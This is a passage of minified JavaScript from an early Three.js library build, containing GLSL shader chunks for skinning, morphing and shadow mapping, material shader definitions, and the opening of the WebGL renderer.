skinbase_vertex:"#ifdef USE_SKINNING\nmat4 boneMatX = getBoneMatrix( skinIndex.x );\nmat4 boneMatY = getBoneMatrix( skinIndex.y );\n#endif",skinning_vertex:"#ifdef USE_SKINNING\n#ifdef USE_MORPHTARGETS\nvec4 skinVertex = vec4( morphed, 1.0 );\n#else\nvec4 skinVertex = vec4( position, 1.0 );\n#endif\nvec4 skinned  = boneMatX * skinVertex * skinWeight.x;\nskinned \t  += boneMatY * skinVertex * skinWeight.y;\n#endif",morphtarget_pars_vertex:"#ifdef USE_MORPHTARGETS\n#ifndef USE_MORPHNORMALS\nuniform float morphTargetInfluences[ 8 ];\n#else\nuniform float morphTargetInfluences[ 4 ];\n#endif\n#endif",
morphtarget_vertex:"#ifdef USE_MORPHTARGETS\nvec3 morphed = vec3( 0.0 );\nmorphed += ( morphTarget0 - position ) * morphTargetInfluences[ 0 ];\nmorphed += ( morphTarget1 - position ) * morphTargetInfluences[ 1 ];\nmorphed += ( morphTarget2 - position ) * morphTargetInfluences[ 2 ];\nmorphed += ( morphTarget3 - position ) * morphTargetInfluences[ 3 ];\n#ifndef USE_MORPHNORMALS\nmorphed += ( morphTarget4 - position ) * morphTargetInfluences[ 4 ];\nmorphed += ( morphTarget5 - position ) * morphTargetInfluences[ 5 ];\nmorphed += ( morphTarget6 - position ) * morphTargetInfluences[ 6 ];\nmorphed += ( morphTarget7 - position ) * morphTargetInfluences[ 7 ];\n#endif\nmorphed += position;\n#endif",
default_vertex:"vec4 mvPosition;\n#ifdef USE_SKINNING\nmvPosition = modelViewMatrix * skinned;\n#endif\n#if !defined( USE_SKINNING ) && defined( USE_MORPHTARGETS )\nmvPosition = modelViewMatrix * vec4( morphed, 1.0 );\n#endif\n#if !defined( USE_SKINNING ) && ! defined( USE_MORPHTARGETS )\nmvPosition = modelViewMatrix * vec4( position, 1.0 );\n#endif\ngl_Position = projectionMatrix * mvPosition;",morphnormal_vertex:"#ifdef USE_MORPHNORMALS\nvec3 morphedNormal = vec3( 0.0 );\nmorphedNormal +=  ( morphNormal0 - normal ) * morphTargetInfluences[ 0 ];\nmorphedNormal +=  ( morphNormal1 - normal ) * morphTargetInfluences[ 1 ];\nmorphedNormal +=  ( morphNormal2 - normal ) * morphTargetInfluences[ 2 ];\nmorphedNormal +=  ( morphNormal3 - normal ) * morphTargetInfluences[ 3 ];\nmorphedNormal += normal;\n#endif",
skinnormal_vertex:"#ifdef USE_SKINNING\nmat4 skinMatrix = skinWeight.x * boneMatX;\nskinMatrix \t+= skinWeight.y * boneMatY;\n#ifdef USE_MORPHNORMALS\nvec4 skinnedNormal = skinMatrix * vec4( morphedNormal, 0.0 );\n#else\nvec4 skinnedNormal = skinMatrix * vec4( normal, 0.0 );\n#endif\n#endif",defaultnormal_vertex:"vec3 objectNormal;\n#ifdef USE_SKINNING\nobjectNormal = skinnedNormal.xyz;\n#endif\n#if !defined( USE_SKINNING ) && defined( USE_MORPHNORMALS )\nobjectNormal = morphedNormal;\n#endif\n#if !defined( USE_SKINNING ) && ! defined( USE_MORPHNORMALS )\nobjectNormal = normal;\n#endif\n#ifdef FLIP_SIDED\nobjectNormal = -objectNormal;\n#endif\nvec3 transformedNormal = normalMatrix * objectNormal;",
shadowmap_pars_fragment:"#ifdef USE_SHADOWMAP\nuniform sampler2D shadowMap[ MAX_SHADOWS ];\nuniform vec2 shadowMapSize[ MAX_SHADOWS ];\nuniform float shadowDarkness[ MAX_SHADOWS ];\nuniform float shadowBias[ MAX_SHADOWS ];\nvarying vec4 vShadowCoord[ MAX_SHADOWS ];\nfloat unpackDepth( const in vec4 rgba_depth ) {\nconst vec4 bit_shift = vec4( 1.0 / ( 256.0 * 256.0 * 256.0 ), 1.0 / ( 256.0 * 256.0 ), 1.0 / 256.0, 1.0 );\nfloat depth = dot( rgba_depth, bit_shift );\nreturn depth;\n}\n#endif",shadowmap_fragment:"#ifdef USE_SHADOWMAP\n#ifdef SHADOWMAP_DEBUG\nvec3 frustumColors[3];\nfrustumColors[0] = vec3( 1.0, 0.5, 0.0 );\nfrustumColors[1] = vec3( 0.0, 1.0, 0.8 );\nfrustumColors[2] = vec3( 0.0, 0.5, 1.0 );\n#endif\n#ifdef SHADOWMAP_CASCADE\nint inFrustumCount = 0;\n#endif\nfloat fDepth;\nvec3 shadowColor = vec3( 1.0 );\nfor( int i = 0; i < MAX_SHADOWS; i ++ ) {\nvec3 shadowCoord = vShadowCoord[ i ].xyz / vShadowCoord[ i ].w;\nbvec4 inFrustumVec = bvec4 ( shadowCoord.x >= 0.0, shadowCoord.x <= 1.0, shadowCoord.y >= 0.0, shadowCoord.y <= 1.0 );\nbool inFrustum = all( inFrustumVec );\n#ifdef SHADOWMAP_CASCADE\ninFrustumCount += int( inFrustum );\nbvec3 frustumTestVec = bvec3( inFrustum, inFrustumCount == 1, shadowCoord.z <= 1.0 );\n#else\nbvec2 frustumTestVec = bvec2( inFrustum, shadowCoord.z <= 1.0 );\n#endif\nbool frustumTest = all( frustumTestVec );\nif ( frustumTest ) {\nshadowCoord.z += shadowBias[ i ];\n#if defined( SHADOWMAP_TYPE_PCF )\nfloat shadow = 0.0;\nconst float shadowDelta = 1.0 / 9.0;\nfloat xPixelOffset = 1.0 / shadowMapSize[ i ].x;\nfloat yPixelOffset = 1.0 / shadowMapSize[ i ].y;\nfloat dx0 = -1.25 * xPixelOffset;\nfloat dy0 = -1.25 * yPixelOffset;\nfloat dx1 = 1.25 * xPixelOffset;\nfloat dy1 = 1.25 * yPixelOffset;\nfDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, dy0 ) ) );\nif ( fDepth < shadowCoord.z ) shadow += shadowDelta;\nfDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( 0.0, dy0 ) ) );\nif ( fDepth < shadowCoord.z ) shadow += shadowDelta;\nfDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, dy0 ) ) );\nif ( fDepth < shadowCoord.z ) shadow += shadowDelta;\nfDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, 0.0 ) ) );\nif ( fDepth < shadowCoord.z ) shadow += shadowDelta;\nfDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy ) );\nif ( fDepth < shadowCoord.z ) shadow += shadowDelta;\nfDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, 0.0 ) ) );\nif ( fDepth < shadowCoord.z ) shadow += shadowDelta;\nfDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, dy1 ) ) );\nif ( fDepth < shadowCoord.z ) shadow += shadowDelta;\nfDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( 0.0, dy1 ) ) );\nif ( fDepth < shadowCoord.z ) shadow += shadowDelta;\nfDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, dy1 ) ) );\nif ( fDepth < shadowCoord.z ) shadow += shadowDelta;\nshadowColor = shadowColor * vec3( ( 1.0 - shadowDarkness[ i ] * shadow ) );\n#elif defined( SHADOWMAP_TYPE_PCF_SOFT )\nfloat shadow = 0.0;\nfloat xPixelOffset = 1.0 / shadowMapSize[ i ].x;\nfloat yPixelOffset = 1.0 / shadowMapSize[ i ].y;\nfloat dx0 = -1.0 * xPixelOffset;\nfloat dy0 = -1.0 * yPixelOffset;\nfloat dx1 = 1.0 * xPixelOffset;\nfloat dy1 = 1.0 * yPixelOffset;\nmat3 shadowKernel;\nmat3 depthKernel;\ndepthKernel[0][0] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, dy0 ) ) );\ndepthKernel[0][1] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, 0.0 ) ) );\ndepthKernel[0][2] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, dy1 ) ) );\ndepthKernel[1][0] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( 0.0, dy0 ) ) );\ndepthKernel[1][1] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy ) );\ndepthKernel[1][2] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( 0.0, dy1 ) ) );\ndepthKernel[2][0] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, dy0 ) ) );\ndepthKernel[2][1] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, 0.0 ) ) );\ndepthKernel[2][2] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, dy1 ) ) );\nvec3 shadowZ = vec3( shadowCoord.z );\nshadowKernel[0] = vec3(lessThan(depthKernel[0], shadowZ ));\nshadowKernel[0] *= vec3(0.25);\nshadowKernel[1] = vec3(lessThan(depthKernel[1], shadowZ ));\nshadowKernel[1] *= vec3(0.25);\nshadowKernel[2] = vec3(lessThan(depthKernel[2], shadowZ ));\nshadowKernel[2] *= vec3(0.25);\nvec2 fractionalCoord = 1.0 - fract( shadowCoord.xy * shadowMapSize[i].xy );\nshadowKernel[0] = mix( shadowKernel[1], shadowKernel[0], fractionalCoord.x );\nshadowKernel[1] = mix( shadowKernel[2], shadowKernel[1], fractionalCoord.x );\nvec4 shadowValues;\nshadowValues.x = mix( shadowKernel[0][1], shadowKernel[0][0], fractionalCoord.y );\nshadowValues.y = mix( shadowKernel[0][2], shadowKernel[0][1], fractionalCoord.y );\nshadowValues.z = mix( shadowKernel[1][1], shadowKernel[1][0], fractionalCoord.y );\nshadowValues.w = mix( shadowKernel[1][2], shadowKernel[1][1], fractionalCoord.y );\nshadow = dot( shadowValues, vec4( 1.0 ) );\nshadowColor = shadowColor * vec3( ( 1.0 - shadowDarkness[ i ] * shadow ) );\n#else\nvec4 rgbaDepth = texture2D( shadowMap[ i ], shadowCoord.xy );\nfloat fDepth = unpackDepth( rgbaDepth );\nif ( fDepth < shadowCoord.z )\nshadowColor = shadowColor * vec3( 1.0 - shadowDarkness[ i ] );\n#endif\n}\n#ifdef SHADOWMAP_DEBUG\n#ifdef SHADOWMAP_CASCADE\nif ( inFrustum && inFrustumCount == 1 ) gl_FragColor.xyz *= frustumColors[ i ];\n#else\nif ( inFrustum ) gl_FragColor.xyz *= frustumColors[ i ];\n#endif\n#endif\n}\n#ifdef GAMMA_OUTPUT\nshadowColor *= shadowColor;\n#endif\ngl_FragColor.xyz = gl_FragColor.xyz * shadowColor;\n#endif",
shadowmap_pars_vertex:"#ifdef USE_SHADOWMAP\nvarying vec4 vShadowCoord[ MAX_SHADOWS ];\nuniform mat4 shadowMatrix[ MAX_SHADOWS ];\n#endif",shadowmap_vertex:"#ifdef USE_SHADOWMAP\nfor( int i = 0; i < MAX_SHADOWS; i ++ ) {\nvShadowCoord[ i ] = shadowMatrix[ i ] * worldPosition;\n}\n#endif",alphatest_fragment:"#ifdef ALPHATEST\nif ( gl_FragColor.a < ALPHATEST ) discard;\n#endif",linear_to_gamma_fragment:"#ifdef GAMMA_OUTPUT\ngl_FragColor.xyz = sqrt( gl_FragColor.xyz );\n#endif"};
THREE.UniformsUtils={merge:function(a){var b,c,e,g={};for(b=0;b<a.length;b++)for(c in e=this.clone(a[b]),e)g[c]=e[c];return g},clone:function(a){var b,c,e,g={};for(b in a)for(c in g[b]={},a[b])e=a[b][c],g[b][c]=e instanceof THREE.Color||e instanceof THREE.Vector2||e instanceof THREE.Vector3||e instanceof THREE.Vector4||e instanceof THREE.Matrix4||e instanceof THREE.Texture?e.clone():e instanceof Array?e.slice():e;return g}};
THREE.UniformsLib={common:{diffuse:{type:"c",value:new THREE.Color(15658734)},opacity:{type:"f",value:1},map:{type:"t",value:null},offsetRepeat:{type:"v4",value:new THREE.Vector4(0,0,1,1)},lightMap:{type:"t",value:null},specularMap:{type:"t",value:null},envMap:{type:"t",value:null},flipEnvMap:{type:"f",value:-1},useRefract:{type:"i",value:0},reflectivity:{type:"f",value:1},refractionRatio:{type:"f",value:.98},combine:{type:"i",value:0},morphTargetInfluences:{type:"f",value:0}},bump:{bumpMap:{type:"t",
value:null},bumpScale:{type:"f",value:1}},normalmap:{normalMap:{type:"t",value:null},normalScale:{type:"v2",value:new THREE.Vector2(1,1)}},fog:{fogDensity:{type:"f",value:2.5E-4},fogNear:{type:"f",value:1},fogFar:{type:"f",value:2E3},fogColor:{type:"c",value:new THREE.Color(16777215)}},lights:{ambientLightColor:{type:"fv",value:[]},directionalLightDirection:{type:"fv",value:[]},directionalLightColor:{type:"fv",value:[]},hemisphereLightDirection:{type:"fv",value:[]},hemisphereLightSkyColor:{type:"fv",
value:[]},hemisphereLightGroundColor:{type:"fv",value:[]},pointLightColor:{type:"fv",value:[]},pointLightPosition:{type:"fv",value:[]},pointLightDistance:{type:"fv1",value:[]},spotLightColor:{type:"fv",value:[]},spotLightPosition:{type:"fv",value:[]},spotLightDirection:{type:"fv",value:[]},spotLightDistance:{type:"fv1",value:[]},spotLightAngleCos:{type:"fv1",value:[]},spotLightExponent:{type:"fv1",value:[]}},particle:{psColor:{type:"c",value:new THREE.Color(15658734)},opacity:{type:"f",value:1},size:{type:"f",
value:1},scale:{type:"f",value:1},map:{type:"t",value:null},fogDensity:{type:"f",value:2.5E-4},fogNear:{type:"f",value:1},fogFar:{type:"f",value:2E3},fogColor:{type:"c",value:new THREE.Color(16777215)}},shadowmap:{shadowMap:{type:"tv",value:[]},shadowMapSize:{type:"v2v",value:[]},shadowBias:{type:"fv1",value:[]},shadowDarkness:{type:"fv1",value:[]},shadowMatrix:{type:"m4v",value:[]}}};
THREE.ShaderLib={basic:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.common,THREE.UniformsLib.fog,THREE.UniformsLib.shadowmap]),vertexShader:[THREE.ShaderChunk.map_pars_vertex,THREE.ShaderChunk.lightmap_pars_vertex,THREE.ShaderChunk.envmap_pars_vertex,THREE.ShaderChunk.color_pars_vertex,THREE.ShaderChunk.morphtarget_pars_vertex,THREE.ShaderChunk.skinning_pars_vertex,THREE.ShaderChunk.shadowmap_pars_vertex,"void main() {",THREE.ShaderChunk.map_vertex,THREE.ShaderChunk.lightmap_vertex,THREE.ShaderChunk.color_vertex,
THREE.ShaderChunk.skinbase_vertex,"#ifdef USE_ENVMAP",THREE.ShaderChunk.morphnormal_vertex,THREE.ShaderChunk.skinnormal_vertex,THREE.ShaderChunk.defaultnormal_vertex,"#endif",THREE.ShaderChunk.morphtarget_vertex,THREE.ShaderChunk.skinning_vertex,THREE.ShaderChunk.default_vertex,THREE.ShaderChunk.worldpos_vertex,THREE.ShaderChunk.envmap_vertex,THREE.ShaderChunk.shadowmap_vertex,"}"].join("\n"),fragmentShader:["uniform vec3 diffuse;\nuniform float opacity;",THREE.ShaderChunk.color_pars_fragment,THREE.ShaderChunk.map_pars_fragment,
THREE.ShaderChunk.lightmap_pars_fragment,THREE.ShaderChunk.envmap_pars_fragment,THREE.ShaderChunk.fog_pars_fragment,THREE.ShaderChunk.shadowmap_pars_fragment,THREE.ShaderChunk.specularmap_pars_fragment,"void main() {\ngl_FragColor = vec4( diffuse, opacity );",THREE.ShaderChunk.map_fragment,THREE.ShaderChunk.alphatest_fragment,THREE.ShaderChunk.specularmap_fragment,THREE.ShaderChunk.lightmap_fragment,THREE.ShaderChunk.color_fragment,THREE.ShaderChunk.envmap_fragment,THREE.ShaderChunk.shadowmap_fragment,
THREE.ShaderChunk.linear_to_gamma_fragment,THREE.ShaderChunk.fog_fragment,"}"].join("\n")},lambert:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.common,THREE.UniformsLib.fog,THREE.UniformsLib.lights,THREE.UniformsLib.shadowmap,{ambient:{type:"c",value:new THREE.Color(16777215)},emissive:{type:"c",value:new THREE.Color(0)},wrapRGB:{type:"v3",value:new THREE.Vector3(1,1,1)}}]),vertexShader:["#define LAMBERT\nvarying vec3 vLightFront;\n#ifdef DOUBLE_SIDED\nvarying vec3 vLightBack;\n#endif",
THREE.ShaderChunk.map_pars_vertex,THREE.ShaderChunk.lightmap_pars_vertex,THREE.ShaderChunk.envmap_pars_vertex,THREE.ShaderChunk.lights_lambert_pars_vertex,THREE.ShaderChunk.color_pars_vertex,THREE.ShaderChunk.morphtarget_pars_vertex,THREE.ShaderChunk.skinning_pars_vertex,THREE.ShaderChunk.shadowmap_pars_vertex,"void main() {",THREE.ShaderChunk.map_vertex,THREE.ShaderChunk.lightmap_vertex,THREE.ShaderChunk.color_vertex,THREE.ShaderChunk.morphnormal_vertex,THREE.ShaderChunk.skinbase_vertex,THREE.ShaderChunk.skinnormal_vertex,
THREE.ShaderChunk.defaultnormal_vertex,THREE.ShaderChunk.morphtarget_vertex,THREE.ShaderChunk.skinning_vertex,THREE.ShaderChunk.default_vertex,THREE.ShaderChunk.worldpos_vertex,THREE.ShaderChunk.envmap_vertex,THREE.ShaderChunk.lights_lambert_vertex,THREE.ShaderChunk.shadowmap_vertex,"}"].join("\n"),fragmentShader:["uniform float opacity;\nvarying vec3 vLightFront;\n#ifdef DOUBLE_SIDED\nvarying vec3 vLightBack;\n#endif",THREE.ShaderChunk.color_pars_fragment,THREE.ShaderChunk.map_pars_fragment,THREE.ShaderChunk.lightmap_pars_fragment,
THREE.ShaderChunk.envmap_pars_fragment,THREE.ShaderChunk.fog_pars_fragment,THREE.ShaderChunk.shadowmap_pars_fragment,THREE.ShaderChunk.specularmap_pars_fragment,"void main() {\ngl_FragColor = vec4( vec3 ( 1.0 ), opacity );",THREE.ShaderChunk.map_fragment,THREE.ShaderChunk.alphatest_fragment,THREE.ShaderChunk.specularmap_fragment,"#ifdef DOUBLE_SIDED\nif ( gl_FrontFacing )\ngl_FragColor.xyz *= vLightFront;\nelse\ngl_FragColor.xyz *= vLightBack;\n#else\ngl_FragColor.xyz *= vLightFront;\n#endif",THREE.ShaderChunk.lightmap_fragment,
THREE.ShaderChunk.color_fragment,THREE.ShaderChunk.envmap_fragment,THREE.ShaderChunk.shadowmap_fragment,THREE.ShaderChunk.linear_to_gamma_fragment,THREE.ShaderChunk.fog_fragment,"}"].join("\n")},phong:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.common,THREE.UniformsLib.bump,THREE.UniformsLib.normalmap,THREE.UniformsLib.fog,THREE.UniformsLib.lights,THREE.UniformsLib.shadowmap,{ambient:{type:"c",value:new THREE.Color(16777215)},emissive:{type:"c",value:new THREE.Color(0)},specular:{type:"c",
value:new THREE.Color(1118481)},shininess:{type:"f",value:30},wrapRGB:{type:"v3",value:new THREE.Vector3(1,1,1)}}]),vertexShader:["#define PHONG\nvarying vec3 vViewPosition;\nvarying vec3 vNormal;",THREE.ShaderChunk.map_pars_vertex,THREE.ShaderChunk.lightmap_pars_vertex,THREE.ShaderChunk.envmap_pars_vertex,THREE.ShaderChunk.lights_phong_pars_vertex,THREE.ShaderChunk.color_pars_vertex,THREE.ShaderChunk.morphtarget_pars_vertex,THREE.ShaderChunk.skinning_pars_vertex,THREE.ShaderChunk.shadowmap_pars_vertex,
"void main() {",THREE.ShaderChunk.map_vertex,THREE.ShaderChunk.lightmap_vertex,THREE.ShaderChunk.color_vertex,THREE.ShaderChunk.morphnormal_vertex,THREE.ShaderChunk.skinbase_vertex,THREE.ShaderChunk.skinnormal_vertex,THREE.ShaderChunk.defaultnormal_vertex,"vNormal = normalize( transformedNormal );",THREE.ShaderChunk.morphtarget_vertex,THREE.ShaderChunk.skinning_vertex,THREE.ShaderChunk.default_vertex,"vViewPosition = -mvPosition.xyz;",THREE.ShaderChunk.worldpos_vertex,THREE.ShaderChunk.envmap_vertex,
THREE.ShaderChunk.lights_phong_vertex,THREE.ShaderChunk.shadowmap_vertex,"}"].join("\n"),fragmentShader:["uniform vec3 diffuse;\nuniform float opacity;\nuniform vec3 ambient;\nuniform vec3 emissive;\nuniform vec3 specular;\nuniform float shininess;",THREE.ShaderChunk.color_pars_fragment,THREE.ShaderChunk.map_pars_fragment,THREE.ShaderChunk.lightmap_pars_fragment,THREE.ShaderChunk.envmap_pars_fragment,THREE.ShaderChunk.fog_pars_fragment,THREE.ShaderChunk.lights_phong_pars_fragment,THREE.ShaderChunk.shadowmap_pars_fragment,
THREE.ShaderChunk.bumpmap_pars_fragment,THREE.ShaderChunk.normalmap_pars_fragment,THREE.ShaderChunk.specularmap_pars_fragment,"void main() {\ngl_FragColor = vec4( vec3 ( 1.0 ), opacity );",THREE.ShaderChunk.map_fragment,THREE.ShaderChunk.alphatest_fragment,THREE.ShaderChunk.specularmap_fragment,THREE.ShaderChunk.lights_phong_fragment,THREE.ShaderChunk.lightmap_fragment,THREE.ShaderChunk.color_fragment,THREE.ShaderChunk.envmap_fragment,THREE.ShaderChunk.shadowmap_fragment,THREE.ShaderChunk.linear_to_gamma_fragment,
THREE.ShaderChunk.fog_fragment,"}"].join("\n")},particle_basic:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.particle,THREE.UniformsLib.shadowmap]),vertexShader:["uniform float size;\nuniform float scale;",THREE.ShaderChunk.color_pars_vertex,THREE.ShaderChunk.shadowmap_pars_vertex,"void main() {",THREE.ShaderChunk.color_vertex,"vec4 mvPosition = modelViewMatrix * vec4( position, 1.0 );\n#ifdef USE_SIZEATTENUATION\ngl_PointSize = size * ( scale / length( mvPosition.xyz ) );\n#else\ngl_PointSize = size;\n#endif\ngl_Position = projectionMatrix * mvPosition;",
THREE.ShaderChunk.worldpos_vertex,THREE.ShaderChunk.shadowmap_vertex,"}"].join("\n"),fragmentShader:["uniform vec3 psColor;\nuniform float opacity;",THREE.ShaderChunk.color_pars_fragment,THREE.ShaderChunk.map_particle_pars_fragment,THREE.ShaderChunk.fog_pars_fragment,THREE.ShaderChunk.shadowmap_pars_fragment,"void main() {\ngl_FragColor = vec4( psColor, opacity );",THREE.ShaderChunk.map_particle_fragment,THREE.ShaderChunk.alphatest_fragment,THREE.ShaderChunk.color_fragment,THREE.ShaderChunk.shadowmap_fragment,
THREE.ShaderChunk.fog_fragment,"}"].join("\n")},dashed:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.common,THREE.UniformsLib.fog,{scale:{type:"f",value:1},dashSize:{type:"f",value:1},totalSize:{type:"f",value:2}}]),vertexShader:["uniform float scale;\nattribute float lineDistance;\nvarying float vLineDistance;",THREE.ShaderChunk.color_pars_vertex,"void main() {",THREE.ShaderChunk.color_vertex,"vLineDistance = scale * lineDistance;\nvec4 mvPosition = modelViewMatrix * vec4( position, 1.0 );\ngl_Position = projectionMatrix * mvPosition;\n}"].join("\n"),
fragmentShader:["uniform vec3 diffuse;\nuniform float opacity;\nuniform float dashSize;\nuniform float totalSize;\nvarying float vLineDistance;",THREE.ShaderChunk.color_pars_fragment,THREE.ShaderChunk.fog_pars_fragment,"void main() {\nif ( mod( vLineDistance, totalSize ) > dashSize ) {\ndiscard;\n}\ngl_FragColor = vec4( diffuse, opacity );",THREE.ShaderChunk.color_fragment,THREE.ShaderChunk.fog_fragment,"}"].join("\n")},depth:{uniforms:{mNear:{type:"f",value:1},mFar:{type:"f",value:2E3},opacity:{type:"f",
value:1}},vertexShader:"void main() {\ngl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );\n}",fragmentShader:"uniform float mNear;\nuniform float mFar;\nuniform float opacity;\nvoid main() {\nfloat depth = gl_FragCoord.z / gl_FragCoord.w;\nfloat color = 1.0 - smoothstep( mNear, mFar, depth );\ngl_FragColor = vec4( vec3( color ), opacity );\n}"},normal:{uniforms:{opacity:{type:"f",value:1}},vertexShader:["varying vec3 vNormal;",THREE.ShaderChunk.morphtarget_pars_vertex,"void main() {\nvNormal = normalize( normalMatrix * normal );",
THREE.ShaderChunk.morphtarget_vertex,THREE.ShaderChunk.default_vertex,"}"].join("\n"),fragmentShader:"uniform float opacity;\nvarying vec3 vNormal;\nvoid main() {\ngl_FragColor = vec4( 0.5 * normalize( vNormal ) + 0.5, opacity );\n}"},depthRGBA:{uniforms:{},vertexShader:[THREE.ShaderChunk.morphtarget_pars_vertex,THREE.ShaderChunk.skinning_pars_vertex,"void main() {",THREE.ShaderChunk.skinbase_vertex,THREE.ShaderChunk.morphtarget_vertex,THREE.ShaderChunk.skinning_vertex,THREE.ShaderChunk.default_vertex,
"}"].join("\n"),fragmentShader:"vec4 pack_depth( const in float depth ) {\nconst vec4 bit_shift = vec4( 256.0 * 256.0 * 256.0, 256.0 * 256.0, 256.0, 1.0 );\nconst vec4 bit_mask  = vec4( 0.0, 1.0 / 256.0, 1.0 / 256.0, 1.0 / 256.0 );\nvec4 res = fract( depth * bit_shift );\nres -= res.xxyz * bit_mask;\nreturn res;\n}\nvoid main() {\ngl_FragData[ 0 ] = pack_depth( gl_FragCoord.z );\n}"}};
THREE.WebGLRenderer=function(a){function b(a){if(a.__webglCustomAttributesList)for(var b in a.__webglCustomAttributesList)l.deleteBuffer(a.__webglCustomAttributesList[b].buffer)}function c(a,b){var c=a.vertices.length,e=b.material;if(e.attributes){void 0===a.__webglCustomAttributesList&&(a.__webglCustomAttributesList=[]);for(var g in e.attributes){var f=e.attributes[g];if(!f.__webglInitialized||f.createUniqueBuffers){f.__webglInitialized=!0;var h=1;"v2"===f.type?h=2:"v3"===f.type?h=3:"v4"===f.type?
h=4:"c"===f.type&&(h=3);f.size=h;f.array=new Float32Array(c*h);f.buffer=l.createBuffer();f.buffer.belongsToAttribute=g;f.needsUpdate=!0}a.__webglCustomAttributesList.push(f)}}}function e(a,b){var c=b.geometry,e=a.faces3,q=a.faces4,k=3*e.length+4*q.length,r=1*e.length+2*q.length,q=3*e.length+4*q.length,e=g(b,a),p=h(e),m=f(e),y=e.vertexColors?e.vertexColors:!1;a.__vertexArray=new Float32Array(3*k);m&&(a.__normalArray=new Float32Array(3*k));c.hasTangents&&(a.__tangentArray=new Float32Array(4*k));y&&
(a.__colorArray=new Float32Array(3*k));if(p){if(0<c.faceUvs.length||0<c.faceVertexUvs.length)a.__uvArray=new Float32Array(2*k);if(1<c.faceUvs.length||1<c.faceVertexUvs.length)a.__uv2Array=new Float32Array(2*k)}b.geometry.skinWeights.length&&b.geometry.skinIndices.length&&(a.__skinIndexArray=new Float32Array(4*k),a.__skinWeightArray=new Float32Array(4*k));a.__faceArray=new Uint16Array(3*r);a.__lineArray=new Uint16Array(2*q);if(a.numMorphTargets)for(a.__morphTargetsArrays=[],c=0,p=a.numMorphTargets;c<
p;c++)a.__morphTargetsArrays.push(new Float32Array(3*k));if(a.numMorphNormals)for(a.__morphNormalsArrays=[],c=0,p=a.numMorphNormals;c<p;c++)a.__morphNormalsArrays.push(new Float32Array(3*k));a.__webglFaceCount=3*r;a.__webglLineCount=2*q;if(e.attributes){void 0===a.__webglCustomAttributesList&&(a.__webglCustomAttributesList=[]);for(var u in e.attributes){var r=e.attributes[u],c={},z;for(z in r)c[z]=r[z];if(!c.__webglInitialized||c.createUniqueBuffers)c.__webglInitialized=!0,q=1,"v2"===c.type?q=2:"v3"===
c.type?q=3:"v4"===c.type?q=4:"c"===c.type&&(q=3),c.size=q,c.array=new Float32Array(k*q),c.buffer=l.createBuffer(),c.buffer.belongsToAttribute=u,r.needsUpdate=!0,c.__original=r;a.__webglCustomAttributesList.push(c)}}a.__inittedArrays=!0}function g(a,b){return a.material instanceof THREE.MeshFaceMaterial?a.material.materials[b.materialIndex]:a.material}function f(a){return a instanceof THREE.MeshBasicMaterial&&!a.envMap||a instanceof THREE.MeshDepthMaterial?!1:a&&void 0!==a.shading&&a.shading===THREE.SmoothShading?
THREE.SmoothShading:THREE.FlatShading}function h(a){return a.map||a.lightMap||a.bumpMap||a.normalMap||a.specularMap||a instanceof THREE.ShaderMaterial?!0:!1}function k(a){Qb[a]||(l.enableVertexAttribArray(a),Qb[a]=!0)}function p(){for(var a in Qb)Qb[a]&&(l.disableVertexAttribArray(a),Qb[a]=!1)}function m(a,b){return a.z!==b.z?b.z-a.z:a.id-b.id}function t(a,b){return b[0]-a[0]}function w(a,b,c){if(a.length)for(var e=0,g=a.length;e<g;e++)cb=Sa=null,ab=Ta=la=fa=xa=db=Ba=-1,qb=!0,a[e].render(b,c,ec,sc),
cb=Sa=null,ab=Ta=la=fa=xa=db=Ba=-1,qb=!0}function q(a,b,c,e,g,f,l,h){var q,k,r,p;b?(k=a.length-1,p=b=-1):(k=0,b=a.length,p=1);for(var m=k;m!==b;m+=p)if(q=a[m],q.render){k=q.object;r=q.buffer;if(h)q=h;else{q=q[c];if(!q)continue;l&&P.setBlending(q.blending,q.blendEquation,q.blendSrc,q.blendDst);P.setDepthTest(q.depthTest);P.setDepthWrite(q.depthWrite);I(q.polygonOffset,q.polygonOffsetFactor,q.polygonOffsetUnits)}P.setMaterialFaces(q);r instanceof THREE.BufferGeometry?P.renderBufferDirect(e,g,f,q,r,
k):P.renderBuffer(e,g,f,q,r,k)}}function y(a,b,c,e,g,f,l){for(var h,q,k=0,r=a.length;k<r;k++)if(h=a[k],q=h.object,q.visible){if(l)h=l;else{h=h[b];if(!h)continue;f&&P.setBlending(h.blending,h.blendEquation,h.blendSrc,h.blendDst);P.setDepthTest(h.depthTest);P.setDepthWrite(h.depthWrite);I(h.polygonOffset,h.polygonOffsetFactor,h.polygonOffsetUnits)}P.renderImmediateObject(c,e,g,h,q)}}function r(a,b){var g,f,h,q;if(void 0===a.__webglInit&&(a.__webglInit=!0,a._modelViewMatrix=new THREE.Matrix4,a._normalMatrix=
